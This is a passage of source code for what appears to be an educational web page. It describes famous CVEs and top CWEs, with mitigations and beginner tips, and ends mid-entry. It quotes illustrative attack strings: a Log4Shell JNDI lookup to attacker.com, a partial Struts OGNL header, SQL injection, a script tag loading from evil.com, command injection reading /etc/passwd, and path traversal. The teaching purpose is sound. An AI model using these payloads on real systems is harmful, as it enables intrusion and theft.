import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Button,
  Container,
  Typography,
  Paper,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Chip,
  alpha,
  useTheme,
  Divider,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Alert,
  AlertTitle,
  Drawer,
  Fab,
  IconButton,
  Tooltip,
  LinearProgress,
  useMediaQuery,
  Card,
  CardContent,
  Slider,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import AssessmentIcon from "@mui/icons-material/Assessment";
import TrendingUpIcon from "@mui/icons-material/TrendingUp";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import QuizIcon from "@mui/icons-material/Quiz";
import CategoryIcon from "@mui/icons-material/Category";
import SpeedIcon from "@mui/icons-material/Speed";
import ShieldIcon from "@mui/icons-material/Shield";
import GavelIcon from "@mui/icons-material/Gavel";
import LaunchIcon from "@mui/icons-material/Launch";
import LocalFireDepartmentIcon from "@mui/icons-material/LocalFireDepartment";
import TimelineIcon from "@mui/icons-material/Timeline";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import MenuBookIcon from "@mui/icons-material/MenuBook";
import PriorityHighIcon from "@mui/icons-material/PriorityHigh";
import BuildIcon from "@mui/icons-material/Build";

const ACCENT_COLOR = "#f59e0b";

// Famous CVEs data
const famousCVEs = [
  {
    id: "CVE-2021-44228",
    name: "Log4Shell",
    year: 2021,
    cvss: 10.0,
    epss: 0.976,
    description: "Remote Code Execution in Apache Log4j via JNDI lookup injection",
    detailedDescription: "**Log4Shell is arguably the most impactful vulnerability of the 2020s.** It affected the Apache Log4j logging library, which is used in millions of Java applications worldwide - from enterprise software to Minecraft servers. The vulnerability allowed attackers to execute arbitrary code on vulnerable servers simply by getting the server to log a specially crafted string. The attack was trivial: just include ${jndi:ldap://attacker.com/a} in any logged data (HTTP headers, username fields, search queries, etc.) and the server would reach out to the attacker's server and execute whatever code they provided. **What made it catastrophic:** Log4j is deeply embedded in countless applications, often as a dependency of other dependencies. Many organizations didn't even know they were using it. The vulnerability was also 'wormable' - once one system was compromised, attackers could use it to scan for and exploit other vulnerable systems on the internal network.",
    impact: "Millions of Java applications compromised worldwide, estimated $10B+ in damages",
    exploitability: "Trivially exploitable with single HTTP request containing ${jndi:ldap://attacker.com/a}",
    mitigation: "Upgrade to Log4j 2.17.1+, set log4j2.formatMsgNoLookups=true, or remove JndiLookup class",
    beginnerTips: [
      "**Why it was so widespread:** Log4j is used in thousands of Java applications as a 'transitive dependency' - meaning your app might use library A, which uses library B, which uses Log4j. You might not even know it's there! This is why Software Bill of Materials (SBOM) tools became critical overnight during Log4Shell.",
      "**The exploit was shockingly simple:** All an attacker needed to do was get the string '${jndi:ldap://evil.com/a}' logged anywhere - in a username, User-Agent header, search box, etc. Log4j would then reach out to the attacker's server and execute whatever Java code they sent back. No authentication needed, no complex exploit chain.",
      "**Why JNDI lookups were dangerous:** JNDI (Java Naming and Directory Interface) is a feature that lets Java apps look up resources from remote servers. Log4j supported JNDI lookups in log messages for 'convenience' - but this meant logging untrusted user input could trigger remote code execution. Lesson: features designed for convenience often become security nightmares.",
      "**The patch journey had multiple steps:** The first patch (2.15.0) was incomplete and could be bypassed. Then 2.16.0 had a DoS vulnerability. Finally 2.17.0+ closed all the holes. This shows why security updates often come in waves - attackers find bypasses and researchers discover related issues. Always monitor for subsequent patches after initial fixes."
    ]
  },
  {
    id: "CVE-2017-5638",
    name: "Apache Struts RCE",
    year: 2017,
    cvss: 10.0,
    epss: 0.975,
    description: "RCE via Content-Type header manipulation in Struts Jakarta Multipart parser",
    detailedDescription: "**This is the vulnerability that caused the Equifax breach** - one of the largest data breaches in history, exposing personal information of 147 million Americans (updated from initial 143M estimate). Apache Struts is a popular Java web application framework. The vulnerability was in how Struts parsed the Content-Type header of HTTP requests. Struts used OGNL (Object-Graph Navigation Language) to parse error messages, and the Content-Type header was processed through OGNL without proper sanitization. **The exploit was shockingly simple:** Send an HTTP request with a malicious Content-Type header like 'Content-Type: ${(#cmd='calc').(#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\")))...}'. The OGNL parser would execute this as code, allowing arbitrary command execution on the server. **What made Equifax breach worse:** Apache disclosed the vulnerability and released a patch on March 7, 2017. Equifax was breached starting March 12, 2017 - just 5 days later. Attackers moved faster than defenders. Equifax didn't patch vulnerable systems until July - FOUR MONTHS after the public disclosure. During this time, attackers exfiltrated 147 million records. The breach cost Equifax over $1.4 billion in settlements and damages.",
    impact: "Equifax breach exposing 143M records (SSNs, DOBs, addresses), $700M settlement",
    exploitability: "Weaponized within hours of disclosure, exploit PoC widely available",
    mitigation: "Upgrade to Struts 2.3.32 or 2.5.10.1+, implement WAF rules, validate Content-Type headers",
    beginnerTips: [
      "**Framework vulnerabilities affect thousands of applications:** Apache Struts was (and still is) used by thousands of enterprise applications. A single framework vulnerability potentially exposes all applications built on it. This is why: (1) Maintain an inventory of frameworks and libraries your applications use (Software Bill of Materials), (2) Subscribe to security mailing lists for your frameworks, (3) Have emergency patching procedures for critical framework vulnerabilities.",
      "**The Equifax timeline shows defensive failures:** March 7: Vulnerability disclosed, patch released. March 12: Attackers begin exploitation (5 days later). May: Equifax discovers the breach (2 months after exploitation began). July: Vulnerability finally patched (4 months after disclosure). This cascade of failures shows the importance of: rapid patch deployment, intrusion detection, and proactive vulnerability scanning.",
      "**OGNL/Expression Language injection is common:** Many frameworks (Struts, Spring, Freemarker, Velocity) use expression languages that can execute code. If user input reaches these expression evaluators unsanitized, RCE results. Always treat any form of 'eval' (whether explicit like Python's eval() or implicit like OGNL parsing) as extremely dangerous when handling user input. Sanitization is hard - the safest approach is avoid dynamic evaluation of untrusted input entirely.",
      "**Content-Type header attacks are often overlooked:** Developers usually sanitize 'obvious' user inputs like form fields and URL parameters. But HTTP headers are also user-controlled! An attacker can set any Content-Type, User-Agent, or custom header they want. Security-conscious code must treat ALL HTTP request components - headers, body, cookies, parameters - as potentially malicious. Never trust metadata just because it's not in the 'main' input."
    ]
  },
  {
    id: "CVE-2014-0160",
    name: "Heartbleed",
    year: 2014,
    cvss: 7.5,
    epss: 0.973,
    description: "Buffer over-read in OpenSSL TLS heartbeat extension allowing memory disclosure",
    detailedDescription: "**Heartbleed was the first vulnerability to get a name and logo**, launching the trend of 'branded vulnerabilities' that we see today. It was a buffer over-read bug in OpenSSL's implementation of the TLS heartbeat extension. The heartbeat was meant to keep TLS connections alive by letting clients send a 'heartbeat request' that servers would echo back. **The bug:** When a client sent a heartbeat request claiming to be X bytes long, the server would send back X bytes - WITHOUT VERIFYING the actual payload was that long. An attacker could send a tiny payload claiming to be 64KB and get back 64KB of whatever happened to be in the server's memory at that moment. **What memory could leak:** Private keys, session tokens, usernames, passwords, emails - basically anything the server had in memory. Worse, this exploitation left no traces in logs, so attackers could steal data silently. An estimated 17% of all SSL/TLS servers on the internet were vulnerable when the bug was discovered.",
    impact: "17% of all internet SSL servers vulnerable at discovery, exposed private keys and session data",
    exploitability: "Silent exploitation without logs, allows theft of private keys and credentials",
    mitigation: "Upgrade OpenSSL to 1.0.1g+, revoke and reissue all SSL certificates, reset user credentials",
    beginnerTips: [
      "**Why it's called 'Heartbleed':** The vulnerable code was in the 'heartbeat' extension of TLS. The bug caused the server to 'bleed' memory contents to attackers. The name, logo, and website (heartbleed.com) made this vulnerability instantly recognizable to non-technical people, changing how security issues are communicated.",
      "**This was a bounds checking failure:** The code did `memcpy(response, request_payload, request_length)` without checking if request_length actually matched the payload size. Always validate lengths before copying memory! This is why modern languages with bounds checking (Rust, Go, Python) prevent this entire class of bugs.",
      "**The disclosure was controversial:** Researchers debated whether to notify OpenSSL developers before public disclosure. Some companies (like Cloudflare and Google) got advance notice and could patch before the public announcement. Smaller organizations had no warning. This raised ethical questions about 'responsible disclosure' timelines.",
      "**Why you needed to revoke SSL certificates:** If attackers extracted your server's private key via Heartbleed, they could impersonate your server or decrypt past TLS traffic they had captured. This meant every potentially compromised certificate needed to be revoked and replaced - a massive undertaking for the industry. Many organizations didn't do this properly."
    ]
  },
  {
    id: "CVE-2017-0144",
    name: "EternalBlue",
    year: 2017,
    cvss: 8.1,
    epss: 0.974,
    description: "SMBv1 RCE vulnerability in Windows allowing network worm propagation",
    detailedDescription: "**EternalBlue is famous not just for what it was, but for WHO discovered it and HOW it was released.** The NSA discovered this SMBv1 (Windows file sharing protocol) vulnerability and developed it into an exploit for intelligence operations. The Shadow Brokers hacker group stole the exploit from the NSA and leaked it publicly in April 2017. Microsoft had actually released a patch (MS17-010) in March 2017 - a month BEFORE the public leak - suggesting they had advance knowledge. **Why it spread like wildfire:** EternalBlue was 'wormable' meaning it could spread automatically from computer to computer without user interaction. WannaCry ransomware used EternalBlue to infect over 230,000 computers in 150 countries in May 2017. NotPetya malware used it in June 2017, causing over $10 billion in damages. Organizations that hadn't patched were sitting ducks. The vulnerability works by sending specially crafted SMBv1 packets that trigger a buffer overflow, allowing remote code execution with SYSTEM privileges.",
    impact: "WannaCry ransomware infected 230K+ computers in 150 countries, NotPetya caused $10B+ damages",
    exploitability: "NSA exploit leaked by Shadow Brokers, automated scanning and exploitation toolkits available",
    mitigation: "Apply MS17-010 patch, disable SMBv1 protocol, implement network segmentation",
    beginnerTips: [
      "**SMBv1 is ancient and should be disabled:** SMB (Server Message Block) version 1 was designed in the 1980s for DOS and has numerous security issues. Windows 10 and Server 2016+ have it disabled by default. If you're still running SMBv1 (check with 'Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol'), disable it immediately. Modern systems use SMBv2/v3 which are much more secure.",
      "**This showed the danger of government exploit stockpiling:** The NSA kept EternalBlue secret to use for espionage rather than reporting it to Microsoft. When the exploit leaked, it armed cybercriminals worldwide. This debate continues: should governments disclose vulnerabilities they discover, or keep them for intelligence purposes? The collateral damage from leaks argues for disclosure.",
      "**Network segmentation could have limited spread:** WannaCry and NotPetya spread so effectively because many organizations had flat networks where workstations could directly communicate with each other via SMB. If networks had been properly segmented (workstations can't reach other workstations, only authorized servers), the worms would have been contained. Lesson: defense in depth matters.",
      "**Patching before exploitation window was narrow:** Microsoft released MS17-010 on March 14, 2017. WannaCry struck May 12, 2017 - just 59 days later. Organizations with slow patch cycles (quarterly patching) never had a chance. For critical vulnerabilities, especially those with known exploits in the wild, emergency out-of-cycle patching is essential."
    ]
  },
  {
    id: "CVE-2021-26855",
    name: "ProxyLogon",
    year: 2021,
    cvss: 9.8,
    epss: 0.972,
    description: "SSRF in Microsoft Exchange Server allowing authentication bypass and RCE",
    detailedDescription: "**ProxyLogon was actually a chain of 4 vulnerabilities** (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065) that when combined, allowed unauthenticated remote code execution on Microsoft Exchange Servers. The primary vulnerability (CVE-2021-26855) was an SSRF (Server-Side Request Forgery) that bypassed authentication. **How the attack chain worked:** Step 1 - Use SSRF to bypass authentication and connect to Exchange backend services. Step 2 - Use another bug (CVE-2021-26857) to execute arbitrary code on the Exchange server by deserializing unsafe data. Step 3 - Use two more bugs (CVE-2021-26858, CVE-2021-27065) to write web shells to the server for persistent access. **The impact was devastating:** Microsoft Exchange is used by businesses worldwide for email. When ProxyLogon was disclosed in March 2021, an estimated 30,000+ Exchange servers were compromised within days. Many organizations didn't even know they were running vulnerable Exchange servers (forgotten 'shadow IT'). Attackers installed web shells that remained even after patching, giving them continued access.",
    impact: "250,000+ Exchange servers compromised, state-sponsored attacks attributed to Hafnium APT",
    exploitability: "Chained with CVE-2021-26857, CVE-2021-26858, CVE-2021-27065 for full compromise",
    mitigation: "Apply Exchange cumulative updates, run Microsoft EOMT scanner, implement network isolation",
    beginnerTips: [
      "**SSRF attacks explained simply:** Normally, your Exchange server's backend (where sensitive operations happen) is protected because it's not exposed to the internet. But ProxyLogon tricked the Exchange server into making requests to its own backend on behalf of the attacker. It's like convincing a security guard to fetch something from a restricted area for you - the guard has access, you don't, but you get the guard to do your bidding.",
      "**Exploit chains are more powerful than single bugs:** Each of the 4 ProxyLogon vulnerabilities alone wasn't catastrophic. CVE-2021-26855 (SSRF) bypassed auth but couldn't execute code. CVE-2021-26857 executed code but needed auth. Combined, they were devastating. Attackers often chain multiple 'medium' vulnerabilities to achieve critical impact. This is why defense in depth matters - one layer's failure shouldn't doom the system.",
      "**Web shells are persistent backdoors:** After exploiting ProxyLogon, attackers installed 'web shells' - PHP/ASPX files that let them run commands remotely via HTTP. Even after applying the patch, these web shells remained on the server. Organizations had to scan for and remove malicious files, not just patch. Lesson: after incidents, investigate what attackers did while inside, don't just close the door they came through.",
      "**Exchange Internet exposure is risky:** Exchange was designed in an era when organizations had fewer security concerns about exposing services to the internet. Modern best practices suggest Exchange should be behind VPNs or zero-trust architectures, not directly internet-accessible. If Exchange must be public-facing, place it behind a reverse proxy with WAF (Web Application Firewall) protection."
    ]
  },
  {
    id: "CVE-2020-1472",
    name: "Zerologon",
    year: 2020,
    cvss: 10.0,
    epss: 0.965,
    description: "Netlogon authentication bypass allowing instant domain controller compromise",
    detailedDescription: "**Zerologon might be the single most elegant exploit of the past decade.** It was a cryptographic vulnerability in Microsoft's Netlogon protocol, which domain controllers use for authentication. The bug was subtle but devastating: the protocol used AES-CFB8 encryption with a static IV (initialization vector) that was all zeros. **Why this mattered:** In AES-CFB8, using a zero IV means encrypting zeros produces predictable output. The Netlogon authentication process used 'encryption' to prove identity, but because the IV was zero, an attacker could send messages encrypted with the zero-key (all zeros) and they would appear valid! **The attack:** Send 256 authentication attempts using all-zero encryption. Due to cryptographic probability, one succeeds. You're now authenticated as the domain controller. Change the DC's password to blank. Congratulations, you now own the entire Active Directory domain - all in under 3 seconds, with zero prior credentials. This attack required no prior access, no phishing, no exploitation - just network access to a domain controller's Netlogon port (typically blocked externally but open internally).",
    impact: "Complete Active Directory domain takeover in seconds without credentials",
    exploitability: "Exploit requires network access to DC, automated tools available (mimikatz integration)",
    mitigation: "Apply KB4565457, enforce secure Netlogon channel, monitor DC authentication attempts",
    beginnerTips: [
      "**Why cryptographic implementations are hard:** Zerologon wasn't a flaw in AES itself - AES is solid. It was a flaw in HOW Microsoft implemented AES in Netlogon. Using AES-CFB8 with a static zero IV broke the security guarantees AES normally provides. Lesson: even if you use 'secure' algorithms, implementing them incorrectly destroys their security. This is why cryptographers say 'don't roll your own crypto'.",
      "**The patching was done in phases:** Microsoft released the patch in August 2020, but initially just 'logged' problematic authentications rather than blocking them. Enforcement mode (actually blocking insecure connections) wasn't required until February 2021 - 6 months later! This was to give organizations time to identify and fix incompatible systems. If you see 'enforcement mode' delays in security patches, understand it's a window where attackers can still exploit the vulnerability.",
      "**Domain Controllers are the crown jewels:** Once you compromise a DC, you own everything in the Active Directory domain - every user account, every computer, every secret. This is why DCs must be: (1) Patched immediately, (2) Monitored 24/7 for anomalies, (3) Isolated on the network, (4) Protected with additional authentication factors. A single DC compromise means complete domain reset.",
      "**Network segmentation could have prevented external attacks:** Zerologon required network access to a DC's Netlogon port. If your DCs are directly reachable from the internet (they shouldn't be!), external attackers could exploit this. If they're only reachable from internal networks, attackers would need internal access first. Proper network architecture raises the bar for attackers significantly."
    ]
  },
  {
    id: "CVE-2021-34527",
    name: "PrintNightmare",
    year: 2021,
    cvss: 8.8,
    epss: 0.962,
    description: "RCE in Windows Print Spooler service via malicious printer driver installation",
    detailedDescription: "**PrintNightmare was messy from start to finish.** It began when security researchers accidentally published a proof-of-concept exploit for what they thought was a patched vulnerability (CVE-2021-1675). Turns out it was a DIFFERENT, unpatched vulnerability that was similar. Oops. The exploit allowed any authenticated user (even low-privilege domain users) to load malicious DLLs into the Print Spooler service running as SYSTEM. **Why Print Spooler:** This Windows service runs with the highest privileges (NT AUTHORITY\\SYSTEM) and is enabled by default on nearly all Windows computers. It's meant to handle print jobs, but the RpcAddPrinterDriver function allowed remote users to specify a DLL path to 'install' a printer driver. **The attack:** Connect to a target Windows machine's Print Spooler service (typically accessible from domain users). Call RpcAddPrinterDriver pointing to a malicious DLL on your attacker-controlled SMB share. The Print Spooler downloads and executes your DLL with SYSTEM privileges. Instant privilege escalation and remote code execution. Even 'domain users' with minimal privileges could exploit this to become SYSTEM on any Windows machine with Print Spooler enabled.",
    impact: "All Windows systems vulnerable, widespread exploitation for ransomware deployment",
    exploitability: "Multiple variants (local and remote), low-privileged user can escalate to SYSTEM",
    mitigation: "Apply KB patches, disable Print Spooler service if not required, restrict driver installation",
    beginnerTips: [
      "**Services running as SYSTEM are high-value targets:** SYSTEM is the highest privilege level on Windows - even higher than Administrator in some ways. Services running as SYSTEM (like Print Spooler) are prime targets because exploiting them instantly grants complete control. Principle of least privilege suggests services should run with minimal permissions needed, but legacy Windows services often run as SYSTEM for backward compatibility.",
      "**The 'accidental' disclosure controversy:** The researchers published their exploit code thinking they were demonstrating a patched bug. When they realized it was a 0-day, they deleted it - but the internet never forgets (someone had forked the repository). This sparked debates: should researchers validate patches before publishing exploits? Should they inform vendors before conferences? The line between 'responsible disclosure' and 'publicity seeking' can be blurry.",
      "**Disabling Print Spooler broke things:** Microsoft's immediate mitigation was 'disable Print Spooler.' But this broke printing (obviously), and also broke some unexpected things like certain Active Directory operations. Many organizations couldn't simply disable it. This shows why 'just disable it' mitigations aren't always practical. Defense requires understanding what services actually do and their dependencies.",
      "**Lateral movement implications:** In enterprise networks, PrintNightmare made lateral movement trivial. An attacker with credentials for any domain user (maybe phished) could use PrintNightmare to gain SYSTEM on any Windows machine they could reach, then extract more credentials, then move to other machines. This is the 'snowball effect' where one small breach becomes total network compromise."
    ]
  },
  {
    id: "CVE-2019-0708",
    name: "BlueKeep",
    year: 2019,
    cvss: 9.8,
    epss: 0.958,
    description: "Pre-authentication RCE in RDP allowing wormable exploitation",
    detailedDescription: "**BlueKeep was called 'the next WannaCry' when it was discovered.** It was a pre-authentication remote code execution vulnerability in RDP (Remote Desktop Protocol), affecting Windows 7, Windows Server 2008, and older versions. The vulnerability was in the RDP service's handling of specialized virtual channel requests (specifically 'MS_T120' channels). An attacker could send a crafted RDP connection request and trigger a use-after-free vulnerability, allowing code execution BEFORE any authentication occurred. **What made it terrifying:** (1) RDP services are commonly exposed to the internet for remote administration, (2) No authentication required - just send packets to port 3389, (3) It was 'wormable' like EternalBlue - malware could use it to spread automatically from machine to machine. **Why it didn't become 'WannaCry 2.0':** Despite the panic, no large-scale BlueKeep worm emerged. Theories why: (1) Microsoft's aggressive patching and awareness campaign worked, (2) Exploitation was tricky - crashes were common, (3) Security community was on high alert after WannaCry. However, over 1 million RDP endpoints remained vulnerable months after disclosure, and cryptocurrency miners exploited some of them.",
    impact: "1M+ vulnerable RDP endpoints exposed to internet, potential for global worm outbreak",
    exploitability: "Metasploit module available, requires no user interaction, wormable like EternalBlue",
    mitigation: "Apply KB4499175, disable RDP if unused, implement NLA (Network Level Authentication)",
    beginnerTips: [
      "**RDP Internet exposure is dangerous:** Shodan (a search engine for internet-connected devices) regularly finds hundreds of thousands of RDP services exposed to the internet. This is like leaving your house's back door open to a public street. Best practices: (1) Never expose RDP directly to the internet, (2) Use VPN for remote access, (3) If RDP must be public, use RDP Gateway or at minimum, change the port and enable Network Level Authentication (NLA).",
      "**Network Level Authentication (NLA) would have prevented BlueKeep:** NLA forces RDP clients to authenticate BEFORE connecting to the RDP service. Since BlueKeep was a pre-authentication vulnerability, NLA blocked it. Windows defaults changed to require NLA after Windows 7, but many legacy systems had it disabled for compatibility. Lesson: security features only work if they're enabled!",
      "**Use-after-free bugs explained:** This bug class happens when code frees memory (using 'free' or 'delete'), then later tries to use that memory again. By that time, the memory might contain attacker-controlled data. The RDP service freed a memory structure but a pointer to it remained accessible. Attackers could trigger allocation of controlled data in that freed space, then trigger the code path that used the dangling pointer, executing attacker data as code.",
      "**The patching window mattered:** Microsoft released patches in May 2019 and took the unusual step of releasing patches even for out-of-support Windows XP and Server 2003. The NSA publicly warned about BlueKeep - a rare move. Despite this, months later, over 1 million systems remained vulnerable. Organizations using end-of-life Windows versions created massive risk. This is why lifecycle management and migration planning are security concerns, not just IT concerns."
    ]
  },
];

// Top CWEs data
const topCWEs = [
  {
    id: "CWE-79",
    name: "Cross-site Scripting (XSS)",
    category: "Injection",
    rank: 1,
    description: "Improper neutralization of input during web page generation allowing script injection",
    realWorldExample: "Stored XSS in WordPress comments allowing cookie theft and session hijacking",
    preventionTechniques: [
      "Output encoding/escaping for HTML context (htmlspecialchars, encodeURIComponent)",
      "Content Security Policy (CSP) headers to restrict script sources",
      "HttpOnly and Secure flags on cookies to prevent JavaScript access",
      "Input validation with allowlists for expected patterns",
      "Use modern frameworks with built-in XSS protection (React, Angular, Vue)"
    ],
    beginnerTips: [
      "**XSS is the #1 web vulnerability:** It appears in 1 out of every 3 web applications tested. The basic concept: attacker injects JavaScript into your page, which executes in victim browsers with full access to that page's data (cookies, session tokens, DOM). Three types: Stored XSS (saved in database, affects all users), Reflected XSS (in URL, affects users who click link), DOM-based XSS (client-side JavaScript mishandling).",
      "**Context matters for encoding:** Encoding `<script>alert(1)</script>` in HTML context requires HTML entity encoding (&lt;script&gt;). But in JavaScript string context you need JavaScript escaping. In URL context you need URL encoding. There's no 'universal XSS encoder' - you must encode appropriately for WHERE the data appears. This is why frameworks like React automatically handle this (they know the context).",
      "**HttpOnly cookies prevent 80% of XSS impact:** Even if XSS exists, if your session cookies have the HttpOnly flag, JavaScript can't read them via document.cookie. Attackers can still perform actions as the user (make API requests, modify DOM) but can't steal the session token to use elsewhere. Always set HttpOnly on authentication cookies - it's free defense in depth.",
      "**Content Security Policy is your second line of defense:** CSP headers tell browsers 'only execute scripts from these sources.' Even if an attacker injects <script src='evil.com/steal.js'>, the browser blocks it if evil.com isn't in your CSP. Start with `script-src 'self'` to only allow same-origin scripts. CSP won't prevent DOM XSS but stops most injection attacks from loading external code.\""
    ]
  },
  {
    id: "CWE-89",
    name: "SQL Injection",
    category: "Injection",
    rank: 2,
    description: "Improper neutralization of special elements used in SQL commands",
    realWorldExample: "' OR '1'='1 bypass in login forms, UNION SELECT attacks exfiltrating database",
    preventionTechniques: [
      "Parameterized queries/prepared statements (NEVER concatenate SQL strings)",
      "ORM frameworks with built-in SQL injection protection",
      "Stored procedures with parameter binding",
      "Input validation with strict type checking and allowlists",
      "Least privilege database accounts (no DROP/ALTER for app accounts)",
      "Web Application Firewall (WAF) rules for common SQL injection patterns"
    ],
    beginnerTips: [
      "**SQL injection has been #1 or #2 for 20+ years:** Despite being well-understood, it remains incredibly common. The attack: inject SQL code into queries by manipulating input. Example: `SELECT * FROM users WHERE username='$input'` becomes `SELECT * FROM users WHERE username='' OR '1'='1'` when input is `' OR '1'='1`. This bypasses authentication because '1'='1' is always true, returning all users.",
      "**Parameterized queries are the ONLY reliable defense:** String concatenation like `\"SELECT * FROM users WHERE id=\" + userId` is ALWAYS vulnerable, no matter how much you sanitize. Parameterized queries separate SQL code from data: `cursor.execute(\"SELECT * FROM users WHERE id=?\", (userId,))`. The database driver handles escaping. Never build SQL strings manually!",
      "**Second-order SQL injection is sneakier:** Classic SQLi injects malicious SQL that executes immediately. Second-order SQLi stores malicious data (like username: `admin'--`) in the database safely (via parameterized query), but later code retrieves and concatenates it into SQL unsafely. The attack executes on the second database operation. Lesson: treat ALL data as untrusted, even data from your own database.",
      "**Least privilege limits SQL injection damage:** If your application's database account only has SELECT permission on the tables it needs, SQL injection can read data but can't DROP tables, modify data, or execute system commands (via xp_cmdshell on SQL Server, LOAD_FILE on MySQL). Create separate database accounts per application with minimal permissions. Don't use 'root' or 'sa' for applications!\""
    ]
  },
  {
    id: "CWE-20",
    name: "Improper Input Validation",
    category: "Input Validation",
    rank: 3,
    description: "Product does not validate or incorrectly validates input leading to unexpected behavior",
    realWorldExample: "File upload bypass allowing .php.jpg double extension, integer overflow in length checks",
    preventionTechniques: [
      "Allowlist validation (define what IS allowed, not what isn't)",
      "Type checking and range validation for all inputs",
      "Canonicalization to handle encoding bypasses (URL encoding, Unicode, etc.)",
      "Reject invalid input rather than sanitizing (fail closed)",
      "Validate on server side (never trust client-side validation)"
    ],
    beginnerTips: [
      "**Input validation is the foundation of security:** Every vulnerability (XSS, SQLi, Command Injection, etc.) is ultimately an input validation failure. The challenge: defining 'valid' is hard. Email validation? Emails can contain + and weird Unicode. Filename validation? Different OS have different restrictions. Start with 'what characters/patterns are DEFINITELY safe' (allowlist) rather than 'what is definitely dangerous' (blocklist) - attackers always find bypasses to blocklists.",
      "**Client-side validation is for UX, not security:** JavaScript validation in browsers helps users fix mistakes (\"email must contain @\") but provides zero security. An attacker can disable JavaScript, modify HTTP requests with Burp Suite, or script direct API calls. ALWAYS validate on the server. Client validation is nice-to-have; server validation is mandatory.",
      "**Canonicalization prevents encoding bypasses:** An attacker might bypass filename validation by submitting '..%2F..%2Fetc%2Fpasswd' (URL encoded) or '..\\u002e\\u002e\\u002fpasswd' (Unicode). Canonicalization converts all representations to a standard form before validation. Use your language's path normalization functions (os.path.normpath in Python, Path.GetFullPath in C#) before checking if path is in allowed directory.",
      "**Integer overflow in validation is common:** Code like `if (userLength < MAX_SIZE)` followed by `malloc(userLength)` can be exploited if userLength is a huge value that overflows when used in calculations. If userLength is 0xFFFFFFFF (4GB) and you add 100, it wraps to 99 due to overflow. Validation passed but allocation is tiny. Use safe integer types, check for overflow, or use memory-safe languages."
    ]
  },
  {
    id: "CWE-125",
    name: "Out-of-bounds Read",
    category: "Memory",
    rank: 4,
    description: "Product reads data past the end of intended buffer leading to information disclosure",
    realWorldExample: "Heartbleed (CVE-2014-0160) reading 64KB of process memory via crafted heartbeat",
    preventionTechniques: [
      "Bounds checking before all array/buffer accesses",
      "Use safe string functions (strncpy, strncat instead of strcpy, strcat)",
      "Memory-safe languages (Rust, Go) or managed runtimes (Java, C#, Python)",
      "AddressSanitizer (ASan) during development and testing",
      "Compiler hardening flags (-fstack-protector, -D_FORTIFY_SOURCE=2)"
    ],
    beginnerTips: [
      "**Heartbleed is the iconic out-of-bounds read:** The OpenSSL heartbeat code did `memcpy(response, payload, payload_length)` without verifying payload_length matched the actual payload size. An attacker claiming a 64KB payload but sending 1 byte got back 64KB - the 1 byte sent plus 65535 bytes of whatever was in memory. This leaked private keys, passwords, session tokens. Lesson: always verify claimed lengths match actual data.",
      "**Bounds checks are tedious but essential in C/C++:** Every `array[index]` access should verify `index < array_size`. Every pointer dereference should verify it's within allocated bounds. This is why modern languages do bounds checking automatically - Python raises IndexError, Rust panics or returns Option::None. In C/C++, out-of-bounds reads often return garbage or crash, making bugs hard to reproduce.",
      "**AddressSanitizer finds bounds violations at runtime:** ASan is a compiler feature (gcc -fsanitize=address) that instruments memory accesses to detect out-of-bounds reads/writes. It catches bugs during testing that might not crash normally but could be exploitable. Run your test suite with ASan enabled - it will slow down execution 2x but catches memory bugs. Many major projects (Chromium, Firefox) use ASan continuously.",
      "**Information disclosure matters:** Out-of-bounds reads don't execute attacker code (unlike buffer overflows), so they seem less critical. But leaking memory can expose: (1) crypto keys for decryption, (2) session tokens for account takeover, (3) memory layout for ASLR bypass, (4) canary values for stack protection bypass. Information disclosure is often the first step in multi-stage exploits."
    ]
  },
  {
    id: "CWE-78",
    name: "OS Command Injection",
    category: "Injection",
    rank: 5,
    description: "Improper neutralization of special elements used in OS commands",
    realWorldExample: "Shell metacharacters (; | & ` $) in ping command allowing arbitrary command execution",
    preventionTechniques: [
      "Avoid shell execution entirely (use language-specific APIs instead of system/exec)",
      "Parameterized execution (subprocess.run(['ping', '-c', '1', host], shell=False))",
      "Strict allowlist validation for command arguments",
      "Drop privileges before executing commands (don't run as root)",
      "Escape shell metacharacters if shell execution unavoidable",
      "Input validation with regex anchors (^[a-zA-Z0-9.-]+$)"
    ],
    beginnerTips: [
      "**Shell metacharacters are the problem:** Running `os.system('ping ' + userInput)` is dangerous because shells interpret special characters. Input of `; cat /etc/passwd` executes two commands: ping (fails) then cat /etc/passwd (succeeds). Other dangerous metacharacters: | (pipe), & (background), \`\` (command substitution), $() (command substitution), > (redirect), < (input), * (wildcard). All let attackers run arbitrary commands.",
      "**The solution: don't use shells:** Instead of `os.system('ping ' + host)`, use `subprocess.run(['ping', '-c', '1', host], shell=False)`. With shell=False, Python executes ping directly without shell interpretation. Arguments are passed as separate list elements, not string concatenation. Even if host contains ';', it's treated as a literal argument to ping (which fails gracefully) rather than executed by the shell.",
      "**Real-world example - ImageTragick:** CVE-2016-3714 in ImageMagick allowed RCE via crafted image files. ImageMagick used system() to call external tools. An image file could contain `https://example.com/image.jpg\" |ls \\\"` which, when processed, executed `ls`. The fix: stop using shell commands for image processing. Lesson: any time your app shells out to external commands with user-influenced data, that's a potential command injection point.",
      "**Escaping is hard, allowlisting is better:** Even if you escape metacharacters, shells have dozens of special characters and encoding tricks. Different shells (bash, sh, cmd.exe, PowerShell) have different escaping rules. Instead of trying to escape, validate input against an allowlist: for hostnames, allow only [a-z0-9.-], for file paths, allow only alphanumeric and specific safe characters. Reject anything else. If you can't use a strict allowlist, don't use shell commands."
    ]
  },
  {
    id: "CWE-416",
    name: "Use After Free",
